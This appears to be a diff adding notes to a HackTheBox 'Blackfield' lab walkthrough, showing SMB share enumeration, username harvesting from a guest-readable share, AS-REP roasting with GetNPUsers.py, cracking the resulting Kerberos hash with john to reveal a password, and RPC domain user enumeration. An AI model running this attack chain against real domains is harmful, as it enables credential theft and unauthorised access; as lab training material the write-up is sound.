@@ -18,6 +18,47 @@ Host script results:
 |   date: 2021-06-22T07:04:30
 |_  start_date: N/A
 
+Play with smbclient:
+└─# smbclient -L \\10.10.10.192
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	forensic        Disk      Forensic / Audit share.
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	profiles$       Disk      
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+A lot of names pop up when listing the profiles$ share. Borrowed a way to narrow that down:
+└─# smbclient -U'guest%' '//10.10.10.192/profiles$' -c ls | grep -E '^\s+[a-z]'
+  audit2020                         
+  support                             
+  svc_backup                          
+
+Following this, is to run checks if any of the above users may be missing kerberos pre-authentication set.
+
+└─# for user in $(cat users.txt ); do python GetNPUsers.py -format john -no-pass "blackfield/$user" -dc-ip 10.10.10.192; echo; done
+A TGT was returned for support;
+└─# hashcat --example-hashes | grep krb5asrep -A 5 -B 5
+MODE: 18200
+TYPE: Kerberos 5, etype 23, AS-REP
+HASH: $krb5asrep$23$user@domain.com:
+
+└─# john -w:/usr/share/wordlists/rockyou.txt support.hash 
+#00^BlackKnight
+
+└─# rpcclient -U'blackfield/support%#00^BlackKnight' 10.10.10.192 -c enumdomusers | grep -Ev BLACKFIELD
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[audit2020] rid:[0x44f]
+user:[support] rid:[0x450]
+user:[svc_backup] rid:[0x585]
+user:[lydericlefebvre] rid:[0x586]
+
 
 Reference:
 https://hackso.me/blackfield-htb-walkthrough/#smb-enumeration
